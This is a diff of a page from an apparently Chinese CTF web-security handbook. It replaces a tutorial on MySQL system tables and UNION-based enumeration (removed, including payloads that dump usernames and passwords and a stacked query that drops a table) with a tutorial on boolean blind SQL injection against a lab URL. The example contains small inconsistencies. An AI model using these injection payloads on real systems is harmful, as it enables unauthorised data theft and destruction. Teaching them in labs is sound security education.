@@ -9,6 +9,10 @@
       
       
       
+        <link rel="prev" href="../SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/">
+      
+      
+        <link rel="next" href="../SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -16,7 +20,7 @@
     
     
       
-        <title>ENV 1 Mysql安装 - CTF-Web修炼手册</title>
+        <title>布尔盲注原理 - CTF-Web修炼手册</title>
       
     
     
@@ -70,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#mysql" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -104,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              ENV 1 Mysql安装
+              布尔盲注原理
             
           </span>
         </div>
@@ -254,10 +258,12 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
+      <li class="md-tabs__item md-tabs__item--active">
         <a href="../SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E4%B8%8E%E7%B1%BB%E5%9E%8B%E5%88%86%E6%9E%90/" class="md-tabs__link">
           
   
@@ -522,28 +528,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
-        
-          
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   
@@ -556,7 +565,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             SQL注入基础
@@ -682,10 +691,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8E%9F%E7%90%86/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    布尔盲注原理
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -696,6 +725,60 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      原理
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      步骤
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      特点与难点
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1142,102 +1225,36 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#mysql" class="md-nav__link">
-    <span class="md-ellipsis">
-      一、MySQL 系统表简介
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema" class="md-nav__link">
-    <span class="md-ellipsis">
-      二、information_schema 数据库
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      三、常见的 SQL 注入信息枚举过程
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema-sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      四、基于 information_schema 的 SQL 注入示例
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="四、基于 information_schema 的 SQL 注入示例">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
     <span class="md-ellipsis">
-      场景
+      原理
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
-      注入步骤
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mysql-mysqluser" class="md-nav__link">
-    <span class="md-ellipsis">
-      五、MySQL 用户账户表 (mysql.user)
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="五、MySQL 用户账户表 (mysql.user)">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#mysql_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      示例：列出 MySQL 用户
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ctf-sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      六、CTF 中的 SQL 注入技巧
+      步骤
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sql_1" class="md-nav__link">
+  <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
-      七、SQL 注入防护
+      示例
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      特点与难点
     </span>
   </a>
   
@@ -1262,188 +1279,112 @@
   
 
 
-  <h1>ENV 1 Mysql安装</h1>
+  <h1>布尔盲注原理</h1>
 
-<h3 id="mysql">一、MySQL 系统表简介</h3>
-<p>MySQL 的 <strong>系统表</strong> 存储在 <code>information_schema</code> 和 <code>mysql</code> 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。</p>
-<ul>
-<li><code>information_schema</code>: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。</li>
-<li><code>mysql</code>: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。</li>
-</ul>
+<p>布尔盲注（Boolean-based Blind SQL Injection）是一种 SQL 注入攻击技术，利用数据库查询的布尔逻辑（真/假）来推断数据库中的数据。它适用于无法直接看到查询结果的场景，例如页面只返回“成功”或“失败”等简单状态。以下是布尔盲注的原理、步骤和示例。</p>
 <hr />
-<h3 id="information_schema">二、<code>information_schema</code> 数据库</h3>
-<p><code>information_schema</code> 是 MySQL 的元数据表，主要包含以下常用的系统表：</p>
-<table>
-<thead>
-<tr>
-<th>系统表</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>TABLES</code></td>
-<td>存储所有数据库中表的信息，如表名、表类型等。</td>
-</tr>
-<tr>
-<td><code>COLUMNS</code></td>
-<td>存储所有数据库中列的信息，如列名、数据类型等。</td>
-</tr>
-<tr>
-<td><code>SCHEMATA</code></td>
-<td>存储所有数据库的名称。</td>
-</tr>
-<tr>
-<td><code>KEY_COLUMN_USAGE</code></td>
-<td>存储主键、外键等约束信息。</td>
-</tr>
-<tr>
-<td><code>USER_PRIVILEGES</code></td>
-<td>存储用户权限信息。</td>
-</tr>
-<tr>
-<td><code>CHARACTER_SETS</code></td>
-<td>存储 MySQL 支持的字符集信息。</td>
-</tr>
-<tr>
-<td><code>COLLATIONS</code></td>
-<td>存储排序规则相关信息。</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="sql">三、常见的 SQL 注入信息枚举过程</h3>
-<p>通过 <strong>SQL 注入</strong> 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：</p>
-<p><strong>获取数据库名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>SELECT schema_name FROM information_schema.schemata;
-</code></pre></div>
-<ul>
-<li>获取当前 MySQL 实例中所有数据库的名称。</li>
-</ul>
-<p><strong>获取表名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;目标数据库&#39;;
-</code></pre></div>
-<ul>
-<li>查询某个数据库 (<code>table_schema</code>) 中的所有表名。</li>
-</ul>
-<p><strong>获取列名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>SELECT column_name FROM information_schema.columns WHERE table_name=&#39;目标表&#39; AND table_schema=&#39;目标数据库&#39;;
-</code></pre></div>
-<ul>
-<li>查询某个表中的所有列名。</li>
-</ul>
-<p><strong>获取表的数据</strong> 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT login_name, login_passwd FROM lesson_user;
-</code></pre></div>
-<hr />
-<h3 id="information_schema-sql">四、基于 <code>information_schema</code> 的 SQL 注入示例</h3>
-<p>假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。</p>
-<h4 id="_1">场景</h4>
-<p>网站存在以下查询：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;;
-</code></pre></div>
-<p>攻击者可以通过修改输入来进行 SQL 注入。</p>
-<h4 id="_2">注入步骤</h4>
-<p><strong>获取数据库名称</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&#39; OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
-</code></pre></div>
-<ul>
-<li>解释：通过 <code>UNION SELECT</code> 合并查询，列出所有数据库名称。</li>
-</ul>
-<p><strong>获取表名</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&#39; OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=&#39;目标数据库&#39; #
-</code></pre></div>
-<ul>
-<li>解释：查询特定数据库中的所有表。</li>
-</ul>
-<p><strong>获取列名</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&#39; OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#39;users&#39; #
-</code></pre></div>
-<ul>
-<li>解释：查询特定表中的所有列名。</li>
-</ul>
-<p><strong>获取敏感数据</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; OR 1=1 UNION SELECT username, password FROM users #
-</code></pre></div>
-<ul>
-<li>解释：获取 <code>users</code> 表中的用户名和密码。</li>
-</ul>
-<hr />
-<h3 id="mysql-mysqluser">五、MySQL 用户账户表 (<code>mysql.user</code>)</h3>
-<p><code>mysql.user</code> 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。</p>
-<table>
-<thead>
-<tr>
-<th>列名</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Host</code></td>
-<td>用户允许登录的主机。</td>
-</tr>
-<tr>
-<td><code>User</code></td>
-<td>用户名。</td>
-</tr>
-<tr>
-<td><code>Password</code></td>
-<td>用户密码（MySQL 8.0 之前存储为 <code>authentication_string</code>）。</td>
-</tr>
-<tr>
-<td><code>Select_priv</code></td>
-<td>是否有 <code>SELECT</code> 权限。</td>
-</tr>
-<tr>
-<td><code>Insert_priv</code></td>
-<td>是否有 <code>INSERT</code> 权限。</td>
-</tr>
-<tr>
-<td>...</td>
-<td>其他权限字段，如 <code>UPDATE</code>, <code>DELETE</code> 等。</td>
-</tr>
-</tbody>
-</table>
-<p>通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。</p>
-<h4 id="mysql_1">示例：列出 MySQL 用户</h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SELECT user, host FROM mysql.user;
-</code></pre></div>
-<hr />
-<h3 id="ctf-sql">六、CTF 中的 SQL 注入技巧</h3>
-<ul>
-<li>
-<p><strong>盲注</strong>：当页面没有明显返回查询结果时，可以通过布尔盲注和时间盲注推测信息。</p>
-</li>
-<li>
-<p><strong>基于 <code>UNION</code> 的注入</strong>：用于获取多个表的结果，特别是当页面返回数据时。</p>
-</li>
-<li>
-<p>堆叠查询</p>
-</li>
-</ul>
-<p>（仅限某些数据库支持）：在一条语句中执行多个查询。</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&#39; OR 1=1; DROP TABLE lesson_user; #
-</code></pre></div>
-<h3 id="sql_1">七、SQL 注入防护</h3>
+<h3 id="_1"><strong>原理</strong></h3>
+<p>布尔盲注的核心思想是通过构造特定的 SQL 注入语句，观察应用程序的响应是否发生变化（例如页面内容、状态码或响应时间），从而推断数据库中的数据。攻击者通过逐位或逐字符猜测数据，利用布尔条件（真/假）来确认猜测是否正确。</p>
+<p>关键点：</p>
 <ol>
-<li><strong>使用预处理语句 (Prepared Statements)</strong>：防止 SQL 注入。</li>
-<li><strong>输入验证</strong>：对用户输入进行过滤和验证，防止恶意字符注入。</li>
-<li><strong>最小权限原则</strong>：限制数据库用户的权限，防止数据被恶意篡改。</li>
-<li><strong>隐藏系统信息</strong>：避免将错误信息直接暴露给用户，防止信息泄露。</li>
+<li>数据库查询的返回值会影响应用程序的行为（例如页面是否显示正常）。</li>
+<li>攻击者通过注入条件语句（如 AND 1=1 或 AND ASCII(SUBSTR(...)) &gt; 65），观察响应变化来推断数据。</li>
+<li>通常需要多次请求，逐一测试每个字符或位的值。</li>
 </ol>
+<hr />
+<h3 id="_2"><strong>步骤</strong></h3>
+<ol>
+<li>确认注入点：</li>
+</ol>
+<p>找到一个可以注入 SQL 语句的参数（例如 URL 参数、表单输入等）。</p>
+<p>测试注入点是否支持布尔逻辑，例如：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">  </span><span class="c1">-- 返回正常页面 </span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w">  </span><span class="c1">-- 返回异常页面（如错误或空白）</span>
+</code></pre></div>
+<p>如果响应不同，说明存在布尔盲注的可能性。</p>
+<ol>
+<li>确定查询逻辑：</li>
+</ol>
+<p>通过注入布尔条件，观察页面响应是否变化。例如：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="w">  </span><span class="c1">-- 页面正常 </span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">2</span><span class="w">  </span><span class="c1">-- 页面异常</span>
+</code></pre></div>
+<p>确认可以通过布尔条件控制页面行为。</p>
+<ol>
+<li>推断数据：</li>
+</ol>
+<p>使用条件语句逐一猜测数据库中的数据，通常结合以下函数：</p>
+<p><em>SUBSTR 或 SUBSTRING：提取字符串的子串。</em></p>
+<p><em>ASCII 或 CHAR：将字符转换为 ASCII 值或反之。</em></p>
+<p><em>LENGTH：获取字符串长度。</em></p>
+<p><em>&gt;, &lt;, =：比较值。</em></p>
+<p>示例：推断数据库版本的第一个字符：</p>
+<p><code>id=1 AND ASCII(SUBSTR((SELECT @@version), 1, 1)) &gt; 65</code></p>
+<p><em>如果页面正常，说明第一个字符的 ASCII 值大于 65（即大于 'A'）。</em></p>
+<p><em>继续调整比较值（如 &gt; 66, = 66），缩小范围，直到确定具体字符。</em></p>
+<ol>
+<li>自动化或手动枚举：</li>
+</ol>
+<p>手动测试效率低，通常使用二分法或自动化工具（如 Burp Suite、SQLMap）来加速猜测。</p>
+<p>例如，通过二分法确定 ASCII 值：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ASCII</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">100</span><span class="w">  </span><span class="c1">-- 正常 </span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ASCII</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">110</span><span class="w">  </span><span class="c1">-- 异常</span>
+</code></pre></div>
+<p>说明 ASCII 值在 100 到 110 之间，继续细分。</p>
+<ol>
+<li>提取完整数据：</li>
+</ol>
+<p>重复上述步骤，逐位提取字符串（如表名、列名、数据内容）。</p>
+<p>例如，提取整个数据库版本字符串需要循环测试每个位置的字符。</p>
+<hr />
+<h3 id="_3"><strong>示例</strong></h3>
+<p>假设有一个 Web 应用，URL 为：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>http://10.16.2.3:8081/Less-8?id=1
+</code></pre></div>
+<p>目标是提取数据库的版本信息（@@version）。</p>
+<ol>
+<li><strong>测试注入点：</strong></li>
+</ol>
+<p><code>http://10.16.2.3:8081/Less-8?id=1 AND 1=1</code></p>
+<p><em>页面正常显示。</em></p>
+<p><code>http://10.16.2.3:8081/Less-8?id=1 AND 1=2</code></p>
+<p><em>页面显示错误或空白。</em></p>
+<p><em>确认存在布尔盲注漏洞。</em></p>
+<ol>
+<li><strong>确定版本字符串长度：</strong></li>
+</ol>
+<p><code>http://10.16.2.3:8081/Less-8?id=1 AND LENGTH((SELECT @@version)) = 10</code></p>
+<p><em>页面正常，说明版本字符串长度为 10。</em></p>
+<p><em>如果不正常，尝试其他长度（如 9、11）。</em></p>
+<ol>
+<li><strong>提取第一个字符：</strong></li>
+</ol>
+<p><code>http://10.16.2.3:8081/Less-8?id=1 AND ASCII(SUBSTR((SELECT @@version), 1, 1)) &gt; 65</code></p>
+<p><em>页面正常，说明第一个字符的 ASCII 值大于 65。</em></p>
+<p><code>http://10.16.2.3:8081/Less-8?id=1 AND ASCII(SUBSTR((SELECT @@version), 1, 1)) = 77</code></p>
+<p><em>页面正常，说明第一个字符的 ASCII 值是 77（即 'M'）。</em></p>
+<p><em>确认第一个字符为 'M'。</em></p>
+<ol>
+<li><strong>提取后续字符：</strong></li>
+</ol>
+<p>重复步骤，测试 SUBSTR((SELECT @@version), 2, 1)、 SUBSTR((SELECT @@version), 3, 1) 等。</p>
+<p>最终可能提取到版本字符串，如 Microsoft SQL Server。</p>
+<hr />
+<h3 id="_4"><strong>特点与难点</strong></h3>
+<p>特点：</p>
+<blockquote>
+<p>不需要直接看到查询结果，适合“盲”场景。</p>
+<p>依赖应用程序的响应差异（页面内容、HTTP 状态码等）。</p>
+<p>可以通过自动化工具高效执行。</p>
+</blockquote>
+<p>难点：</p>
+<blockquote>
+<p>需要多次请求，效率较低（尤其手动测试时）。</p>
+<p>响应差异可能微妙（如仅文本变化），需要仔细分析。</p>
+<p>可能受限于网络延迟或应用程序的防御机制（如 WAF）。</p>
+</blockquote>
 
 
 
